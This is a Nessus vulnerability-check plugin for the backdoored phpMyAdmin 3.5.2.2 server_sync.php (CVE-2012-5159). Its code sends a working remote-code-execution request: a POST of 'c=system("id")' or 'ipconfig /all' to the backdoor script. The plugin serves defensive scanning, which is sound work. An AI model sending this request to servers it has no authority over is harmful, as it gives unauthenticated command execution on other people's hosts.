#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(62312);
  script_version("$Revision: 1.7 $");
  script_cvs_date("$Date: 2016/11/23 20:42:23 $");

  script_cve_id("CVE-2012-5159");
  script_bugtraq_id(55672);
  script_osvdb_id(85739);

  script_name(english:"phpMyAdmin server_sync.php Backdoor (PMASA-2012-5)");
  script_summary(english:"Tries to execute a command");

  script_set_attribute(attribute:"synopsis", value:"A web application hosted on the remote web server has a backdoor.");
  script_set_attribute(attribute:"description", value:
"The phpMyAdmin install hosted on the remote web server contains a
backdoor script, probably obtained from the cdnetworks-kr-1
SourceForge.net mirror site as part of the file
phpMyAdmin-3.5.2.2-all-languages.zip.  An unauthenticated, remote
attacker can use this backdoor to execute arbitrary PHP code on the
remote host, subject to the privileges under which the web server
operates.

Note that the bogus distribution file is also reported to have contained
a modified version of the file js/cross_framing_protection.js, although
Nessus has not tested for that.");
  script_set_attribute(attribute:"see_also", value:"http://www.phpmyadmin.net/home_page/security/PMASA-2012-5.php");
  script_set_attribute(attribute:"solution", value:
"Remove the affected phpMyAdmin install and conduct a full security
review of the web server, as it may have been compromised.  Use only a
trusted mirror to download the application again.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'phpMyAdmin 3.5.2.2 server_sync.php Backdoor');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'D2ExploitPack');

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/09/25");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/09/25");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/09/26");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:phpmyadmin:phpmyadmin");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2016 Tenable Network Security, Inc.");

  script_dependencies("phpMyAdmin_detect.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP", "www/phpMyAdmin");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

port = get_http_port(default:80, php:TRUE);

install = get_install_from_kb(
  appname      : "phpMyAdmin",
  port         : port,
  exit_on_fail : TRUE
);
dir = install['dir'];

if (report_paranoia < 2 && (os = get_kb_item('Host/OS')))
{
  if ('Windows' >< os)
    cmds = make_list('ipconfig /all');
  else
    cmds = make_list('id');
}
else cmds = make_list('id', 'ipconfig /all');

cmd_pats['id'] = 'uid=[0-9]+.*gid=[0-9]+.*';
cmd_pats['ipconfig /all'] = 'Windows IP Configuration';

foreach cmd (cmds)
{
  php = 'system("' + cmd + '");';
  res = http_send_recv3(
    method       : 'POST',
    port         : port,
    item         : dir + "/server_sync.php",
    data         : "c=" + urlencode(str:php),
    content_type : "application/x-www-form-urlencoded",
    exit_on_fail : TRUE
  );

  if (egrep(pattern:cmd_pats[cmd], string:res[2]))
  {
    if (report_verbosity > 0)
    {
      report =
        '\n' + "Nessus was able to execute the command '" + cmd + "' on the remote" +
        '\n' + 'host using the following request :' +
        '\n' +
        '\n' + crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30) +
        '\n' + http_last_sent_request() +
        '\n' + crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30) + 
        '\n';
      if (report_verbosity > 1)
      {
        report +=
          '\n' + 'This produced the following output :' +
          '\n' +
          '\n' + chomp(res[2]) +
          '\n' +
          '\n';
      }
      security_hole(port:port, extra:report);
    }
    else security_hole(port);
    exit(0);
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, "phpMyAdmin", build_url(qs:dir+'/', port:port));
